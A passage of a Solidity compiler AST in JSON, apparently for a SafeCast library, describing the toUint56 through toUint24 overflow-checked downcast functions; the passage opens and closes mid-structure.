pure"}},"id":4397,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13882:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint56","typeString":"type(uint56)"}},"id":4398,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"13895:3:7","memberName":"max","nodeType":"MemberAccess","src":"13882:16:7","typeDescriptions":{"typeIdentifier":"t_uint56","typeString":"uint56"}},"src":"13874:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4406,"nodeType":"IfStatement","src":"13870:103:7","trueBody":{"id":4405,"nodeType":"Block","src":"13900:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3536","id":4401,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"13952:2:7","typeDescriptions":{"typeIdentifier":"t_rational_56_by_1","typeString":"int_const 56"},"value":"56"},{"id":4402,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4388,"src":"13956:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_56_by_1","typeString":"int_const 56"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4400,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"13921:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4403,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13921:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4404,"nodeType":"RevertStatement","src":"13914:48:7"}]}},{"expression":{"arguments":[{"id":4409,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4388,"src":"13996:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4408,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"13989:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint56_$","typeString":"type(uint56)"},"typeName":{"id":4407,"name":"uint56","nodeType":"ElementaryTypeName","src":"13989:6:7","typeDescriptions":{}}},"id":4410,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"13989:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint56","typeString":"uint56"}},"functionReturnParameters":4392,"id":4411,"nodeType":"Return","src":"13982:20:7"}]},"documentation":{"id":4386,"nodeType":"StructuredDocumentation","src":"13515:276:7","text":" @dev Returns the downcasted uint56 from uint256, reverting on\n overflow (when the input is greater than largest uint56).\n Counterpart to Solidity's `uint56` operator.\n Requirements:\n - input must fit into 56 bits"},"id":4413,"implemented":true,"kind":"function","modifiers":[],"name":"toUint56","nameLocation":"13805:8:7","nodeType":"FunctionDefinition","parameters":{"id":4389,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4388,"mutability":"mutable","name":"value","nameLocation":"13822:5:7","nodeType":"VariableDeclaration","scope":4413,"src":"13814:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4387,"name":"uint256","nodeType":"ElementaryTypeName","src":"13814:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"13813:15:7"},"returnParameters":{"id":4392,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4391,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4413,"src":"13852:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint56","typeString":"uint56"},"typeName":{"id":4390,"name":"uint56","nodeType":"ElementaryTypeName","src":"13852:6:7","typeDescriptions":{"typeIdentifier":"t_uint56","typeString":"uint56"}},"visibility":"internal"}],"src":"13851:8:7"},"scope":5451,"src":"13796:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4440,"nodeType":"Block","src":"14360:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4427,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4421,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4416,"src":"14374:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4424,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"14387:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint48_$","typeString":"type(uint48)"},"typeName":{"id":4423,"name":"uint48","nodeType":"ElementaryTypeName","src":"14387:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint48_$","typeString":"type(uint48)"}],"id":4422,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"14382:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4425,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14382:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint48","typeString":"type(uint48)"}},"id":4426,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"14395:3:7","memberName":"max","nodeType":"MemberAccess","src":"14382:16:7","typeDescriptions":{"typeIdentifier":"t_uint48","typeString":"uint48"}},"src":"14374:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4434,"nodeType":"IfStatement","src":"14370:103:7","trueBody":{"id":4433,"nodeType":"Block","src":"14400:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3438","id":4429,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"14452:2:7","typeDescriptions":{"typeIdentifier":"t_rational_48_by_1","typeString":"int_const 48"},"value":"48"},{"id":4430,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4416,"src":"14456:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_48_by_1","typeString":"int_const 48"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4428,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"14421:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4431,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14421:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4432,"nodeType":"RevertStatement","src":"14414:48:7"}]}},{"expression":{"arguments":[{"id":4437,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4416,"src":"14496:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4436,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"14489:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint48_$","typeString":"type(uint48)"},"typeName":{"id":4435,"name":"uint48","nodeType":"ElementaryTypeName","src":"14489:6:7","typeDescriptions":{}}},"id":4438,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14489:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint48","typeString":"uint48"}},"functionReturnParameters":4420,"id":4439,"nodeType":"Return","src":"14482:20:7"}]},"documentation":{"id":4414,"nodeType":"StructuredDocumentation","src":"14015:276:7","text":" @dev Returns the downcasted uint48 from uint256, reverting on\n overflow (when the input is greater than largest uint48).\n Counterpart to Solidity's `uint48` operator.\n Requirements:\n - input must fit into 48 bits"},"id":4441,"implemented":true,"kind":"function","modifiers":[],"name":"toUint48","nameLocation":"14305:8:7","nodeType":"FunctionDefinition","parameters":{"id":4417,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4416,"mutability":"mutable","name":"value","nameLocation":"14322:5:7","nodeType":"VariableDeclaration","scope":4441,"src":"14314:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4415,"name":"uint256","nodeType":"ElementaryTypeName","src":"14314:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"14313:15:7"},"returnParameters":{"id":4420,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4419,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4441,"src":"14352:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint48","typeString":"uint48"},"typeName":{"id":4418,"name":"uint48","nodeType":"ElementaryTypeName","src":"14352:6:7","typeDescriptions":{"typeIdentifier":"t_uint48","typeString":"uint48"}},"visibility":"internal"}],"src":"14351:8:7"},"scope":5451,"src":"14296:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4468,"nodeType":"Block","src":"14860:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4455,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4449,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4444,"src":"14874:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4452,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"14887:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint40_$","typeString":"type(uint40)"},"typeName":{"id":4451,"name":"uint40","nodeType":"ElementaryTypeName","src":"14887:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint40_$","typeString":"type(uint40)"}],"id":4450,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"14882:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4453,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14882:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint40","typeString":"type(uint40)"}},"id":4454,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"14895:3:7","memberName":"max","nodeType":"MemberAccess","src":"14882:16:7","typeDescriptions":{"typeIdentifier":"t_uint40","typeString":"uint40"}},"src":"14874:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4462,"nodeType":"IfStatement","src":"14870:103:7","trueBody":{"id":4461,"nodeType":"Block","src":"14900:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3430","id":4457,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"14952:2:7","typeDescriptions":{"typeIdentifier":"t_rational_40_by_1","typeString":"int_const 40"},"value":"40"},{"id":4458,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4444,"src":"14956:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_40_by_1","typeString":"int_const 40"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4456,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"14921:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4459,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14921:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4460,"nodeType":"RevertStatement","src":"14914:48:7"}]}},{"expression":{"arguments":[{"id":4465,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4444,"src":"14996:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4464,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"14989:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint40_$","typeString":"type(uint40)"},"typeName":{"id":4463,"name":"uint40","nodeType":"ElementaryTypeName","src":"14989:6:7","typeDescriptions":{}}},"id":4466,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"14989:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint40","typeString":"uint40"}},"functionReturnParameters":4448,"id":4467,"nodeType":"Return","src":"14982:20:7"}]},"documentation":{"id":4442,"nodeType":"StructuredDocumentation","src":"14515:276:7","text":" @dev Returns the downcasted uint40 from uint256, reverting on\n overflow (when the input is greater than largest uint40).\n Counterpart to Solidity's `uint40` operator.\n Requirements:\n - input must fit into 40 bits"},"id":4469,"implemented":true,"kind":"function","modifiers":[],"name":"toUint40","nameLocation":"14805:8:7","nodeType":"FunctionDefinition","parameters":{"id":4445,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4444,"mutability":"mutable","name":"value","nameLocation":"14822:5:7","nodeType":"VariableDeclaration","scope":4469,"src":"14814:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4443,"name":"uint256","nodeType":"ElementaryTypeName","src":"14814:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"14813:15:7"},"returnParameters":{"id":4448,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4447,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4469,"src":"14852:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint40","typeString":"uint40"},"typeName":{"id":4446,"name":"uint40","nodeType":"ElementaryTypeName","src":"14852:6:7","typeDescriptions":{"typeIdentifier":"t_uint40","typeString":"uint40"}},"visibility":"internal"}],"src":"14851:8:7"},"scope":5451,"src":"14796:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4496,"nodeType":"Block","src":"15360:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4483,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4477,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4472,"src":"15374:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4480,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"15387:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint32_$","typeString":"type(uint32)"},"typeName":{"id":4479,"name":"uint32","nodeType":"ElementaryTypeName","src":"15387:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint32_$","typeString":"type(uint32)"}],"id":4478,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"15382:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4481,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15382:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint32","typeString":"type(uint32)"}},"id":4482,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"15395:3:7","memberName":"max","nodeType":"MemberAccess","src":"15382:16:7","typeDescriptions":{"typeIdentifier":"t_uint32","typeString":"uint32"}},"src":"15374:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4490,"nodeType":"IfStatement","src":"15370:103:7","trueBody":{"id":4489,"nodeType":"Block","src":"15400:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3332","id":4485,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"15452:2:7","typeDescriptions":{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},"value":"32"},{"id":4486,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4472,"src":"15456:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_32_by_1","typeString":"int_const 32"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4484,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"15421:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4487,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15421:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4488,"nodeType":"RevertStatement","src":"15414:48:7"}]}},{"expression":{"arguments":[{"id":4493,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4472,"src":"15496:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4492,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"15489:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint32_$","typeString":"type(uint32)"},"typeName":{"id":4491,"name":"uint32","nodeType":"ElementaryTypeName","src":"15489:6:7","typeDescriptions":{}}},"id":4494,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15489:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint32","typeString":"uint32"}},"functionReturnParameters":4476,"id":4495,"nodeType":"Return","src":"15482:20:7"}]},"documentation":{"id":4470,"nodeType":"StructuredDocumentation","src":"15015:276:7","text":" @dev Returns the downcasted uint32 from uint256, reverting on\n overflow (when the input is greater than largest uint32).\n Counterpart to Solidity's `uint32` operator.\n Requirements:\n - input must fit into 32 bits"},"id":4497,"implemented":true,"kind":"function","modifiers":[],"name":"toUint32","nameLocation":"15305:8:7","nodeType":"FunctionDefinition","parameters":{"id":4473,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4472,"mutability":"mutable","name":"value","nameLocation":"15322:5:7","nodeType":"VariableDeclaration","scope":4497,"src":"15314:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4471,"name":"uint256","nodeType":"ElementaryTypeName","src":"15314:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"15313:15:7"},"returnParameters":{"id":4476,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4475,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4497,"src":"15352:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint32","typeString":"uint32"},"typeName":{"id":4474,"name":"uint32","nodeType":"ElementaryTypeName","src":"15352:6:7","typeDescriptions":{"typeIdentifier":"t_uint32","typeString":"uint32"}},"visibility":"internal"}],"src":"15351:8:7"},"scope":5451,"src":"15296:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4524,"nodeType":"Block","src":"15860:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4511,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4505,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4500,"src":"15874:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4508,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"15887:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint24_$","typeString":"type(uint24)"},"typeName":{"id":4507,"name":"uint24","nodeType":"ElementaryTypeName","src":"15887:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint24_$","typeString":"type(uint24)"}],"id":4506,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"15882:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4509,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15882:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint24","typeString":"type(uint24)"}},"id":4510,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"15895:3:7","memberName":"max","nodeType":"MemberAccess","src":"15882:16:7","typeDescriptions":{"typeIdentifier":"t_uint24","typeString":"uint24"}},"src":"15874:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4518,"nodeType":"IfStatement","src":"15870:103:7","trueBody":{"id":4517,"nodeType":"Block","src":"15900:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3234","id":4513,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"15952:2:7","typeDescriptions":{"typeIdentifier":"t_rational_24_by_1","typeString":"int_const 24"},"value":"24"},{"id":4514,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4500,"src":"15956:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_24_by_1","typeString":"int_const 24"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4512,"name":"SafeCastOverflowedUintDowncast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3696,"src":"15921:30:7","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_uint8_$_t_uint256_$returns$_t_error_$","typeString":"function (uint8,uint256) pure returns (error)"}},"id":4515,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15921:41:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":4516,"nodeType":"RevertStatement","src":"15914:48:7"}]}},{"expression":{"arguments":[{"id":4521,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4500,"src":"15996:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":4520,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"15989:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint24_$","typeString":"type(uint24)"},"typeName":{"id":4519,"name":"uint24","nodeType":"ElementaryTypeName","src":"15989:6:7","typeDescriptions":{}}},"id":4522,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"15989:13:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint24","typeString":"uint24"}},"functionReturnParameters":4504,"id":4523,"nodeType":"Return","src":"15982:20:7"}]},"documentation":{"id":4498,"nodeType":"StructuredDocumentation","src":"15515:276:7","text":" @dev Returns the downcasted uint24 from uint256, reverting on\n overflow (when the input is greater than largest uint24).\n Counterpart to Solidity's `uint24` operator.\n Requirements:\n - input must fit into 24 bits"},"id":4525,"implemented":true,"kind":"function","modifiers":[],"name":"toUint24","nameLocation":"15805:8:7","nodeType":"FunctionDefinition","parameters":{"id":4501,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4500,"mutability":"mutable","name":"value","nameLocation":"15822:5:7","nodeType":"VariableDeclaration","scope":4525,"src":"15814:13:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":4499,"name":"uint256","nodeType":"ElementaryTypeName","src":"15814:7:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"15813:15:7"},"returnParameters":{"id":4504,"nodeType":"ParameterList","parameters":[{"constant":false,"id":4503,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":4525,"src":"15852:6:7","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint24","typeString":"uint24"},"typeName":{"id":4502,"name":"uint24","nodeType":"ElementaryTypeName","src":"15852:6:7","typeDescriptions":{"typeIdentifier":"t_uint24","typeString":"uint24"}},"visibility":"internal"}],"src":"15851:8:7"},"scope":5451,"src":"15796:213:7","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":4552,"nodeType":"Block","src":"16360:149:7","statements":[{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":4539,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":4533,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4528,"src":"16374:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":4536,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"16387:6:7","typeDescriptions":{"typeIdentifier":"t_type$_t_uint16_$","typeString":"type(uint16)"},"typeName":{"id":4535,"name":"uint16","nodeType":"ElementaryTypeName","src":"16387:6:7","typeDescriptions":{}}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_type$_t_uint16_$","typeString":"type(uint16)"}],"id":4534,"name":"type","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-27,"src":"16382:4:7","typeDescriptions":{"typeIdentifier":"t_function_metatype_pure$__$returns$__$","typeString":"function () pure"}},"id":4537,"isConstant":false,"isLValue":false,"isPure":true,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"16382:12:7","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_magic_meta_type_t_uint16","typeString":"type(uint16)"}},"id":4538,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"memberLocation":"16395:3:7","memberName":"max","nodeType":"MemberAccess","src":"16382:16:7","typeDescriptions":{"typeIdentifier":"t_uint16","typeString":"uint16"}},"src":"16374:24:7","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":4546,"nodeType":"IfStatement","src":"16370:103:7","trueBody":{"id":4545,"nodeType":"Block","src":"16400:73:7","statements":[{"errorCall":{"arguments":[{"hexValue":"3136","id":4541,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"16452:2:7","typeDescriptions":{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 16"},"value":"16"},{"id":4542,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":4528,"src":"16456:5:7","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_16_by_1","typeString":"int_const 